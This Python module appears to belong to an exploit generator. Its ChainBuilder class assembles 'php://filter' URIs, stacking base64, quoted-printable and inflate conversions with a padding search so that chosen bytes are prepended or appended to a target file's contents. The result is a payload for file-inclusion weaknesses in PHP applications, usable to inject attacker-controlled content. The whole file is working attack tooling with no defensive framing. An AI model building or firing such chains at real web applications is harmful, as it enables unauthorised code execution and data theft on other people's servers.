from collections import deque

from .appender import Appender
from ..constants.appenders import APPENDERS
from ..constants.operations import QPE, INFLATE_2, B64D, QPD, B64E, MULT_3, ANTI_MULT_3
from ..constants.prependers import PREPENDERS

PREAMBLE_CHAIN = B64E / MULT_3 / MULT_3 / B64E
POSTAMBLE_CHAIN = B64D / ANTI_MULT_3 / ANTI_MULT_3

QPE_SAFE_CHARS = b"\t !\"#$%&'()*+,-./0123456789:;<>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"


class ChainBuilder:
    def __init__(self):
        self.chain = PREAMBLE_CHAIN
        self.length_mod_3 = 0
        self.appended_base64_count = 0
        self.is_clean = True

        # Should stay the same and only change when bytes are appended since QPE of any unsafe byte, say '\xff' turns into
        # '=FF' and now '=' is an unsafe byte
        # Same with QPD: '=FF' -> '\xff' both 1 unsafe byte
        self.non_qp_safe_count = 0

        # Tracks how many bytes were encoded in each layer
        self.qpe_stack = []

        self.reinflate()

    def qpe(self):
        self.chain = self.chain / QPE
        self.length_mod_3 = (self.length_mod_3 + self.non_qp_safe_count * 2) % 3
        self.qpe_stack.append(self.non_qp_safe_count)

    def qpd(self):
        if len(self.qpe_stack) <= 0:
            raise RuntimeError("Tried to QPD without previous QPE")

        self.chain = self.chain / QPD
        layer_encoded_count = self.qpe_stack.pop()
        self.length_mod_3 = (self.length_mod_3 - layer_encoded_count * 2) % 3

    def pad(self, target_padding: int):

        # BFS queue stores: (current_length_mod_3, current_qpe_stack, path_of_operations)
        queue = deque([(self.length_mod_3, self.qpe_stack.copy(), [])])
        visited = set()

        valid_path = None

        while queue:
            curr_mod, curr_stack, path = queue.popleft()

            current_padding = (3 - curr_mod) % 3

            if current_padding == target_padding and path and path[-1] is QPE:
                valid_path = path
                break

            # State signature to avoid redundant paths in our search
            state_sig = (curr_mod, tuple(curr_stack))
            if state_sig in visited:
                continue
            visited.add(state_sig)

            # Limit depth to 20 to prevent infinite loops on true deadlocks
            if len(path) >= 20:
                continue

            next_mod_qpe = (curr_mod + self.non_qp_safe_count * 2) % 3
            next_stack_qpe = curr_stack + [self.non_qp_safe_count]
            queue.append((next_mod_qpe, next_stack_qpe, path + [QPE]))

            if curr_stack:
                popped = curr_stack[-1]
                next_mod_qpd = (curr_mod - popped * 2) % 3
                next_stack_qpd = curr_stack[:-1]
                queue.append((next_mod_qpd, next_stack_qpd, path + [QPD]))

        if valid_path is None:
            raise RuntimeError(
                f"Deadlock! Cannot reach padding {target_padding} ending in QPE. unsafe_count={self.non_qp_safe_count}, stack={self.qpe_stack}"
            )

        for op in valid_path:
            if op is QPE:
                self.qpe()
            elif op is QPD:
                self.qpd()

        # Count how many "useful" lifelines we have in the stack (not a multiple of 3)
        useful_items = sum(1 for x in self.qpe_stack if x % 3 != 0)

        # If we currently have the ability to generate GOOD lifelines, we stock up!
        if self.non_qp_safe_count % 3 != 0:
            # We ensure we always have a hoard of at least 6 lifelines
            while useful_items < 6:
                # Doing EXACTLY 3 QPEs preserves the padding perfectly but restocks our stack.
                for _ in range(3):
                    self.qpe()
                    valid_path.append(QPE)
                useful_items += 3

        return valid_path

    def append(self, appender: Appender):
        self.pad(appender.required_padding)
        self.chain = self.chain / appender.chain
        self.non_qp_safe_count += sum([1 if b not in QPE_SAFE_CHARS else 0 for b in appender.bytes])
        self.length_mod_3 = (self.length_mod_3 + len(appender.bytes)) % 3
        self.appended_base64_count += 1

        self.is_clean = False

    def append_seq(self, seq: str):
        for i, c in enumerate(seq):
            self.append(APPENDERS[c])

    def prepend_seq(self, seq: str):
        if len(seq) % 4 != 0:
            raise ValueError(
                f"seq: '{seq}' is of length {len(seq)} which is not a multiple of 4!\n"
                f"pad the end with a character of your choosing and than pass it to this function"
            )

        # M is the shortest chain that preserves its own padding (9 added bytes % 3 = 0)
        self.pad(APPENDERS["M"].required_padding)
        for _ in range(len(seq)):
            self.chain = self.chain / APPENDERS["M"].chain

        self.cleanup()

        for c in reversed(seq):
            self.chain = self.chain / PREPENDERS[c] / B64D / B64E

    def cleanup(self):
        for _ in range(len(self.qpe_stack)):
            self.qpe_stack.pop()
            self.chain = self.chain / QPD
        self.chain = self.chain / B64D / B64E

        self.length_mod_3 = self.appended_base64_count % 3
        self.non_qp_safe_count = 0

        self.is_clean = True

    def reinflate(self):
        self.chain = self.chain / INFLATE_2 / QPE
        self.non_qp_safe_count += 2
        self.qpe_stack.append(2)

        self.is_clean = False

    def finalize(self):
        if not self.is_clean:
            self.cleanup()
        self.chain = self.chain / POSTAMBLE_CHAIN

    def construct_chain(self, file):
        return f"php://filter/{str(self.chain)}/resource={file}"
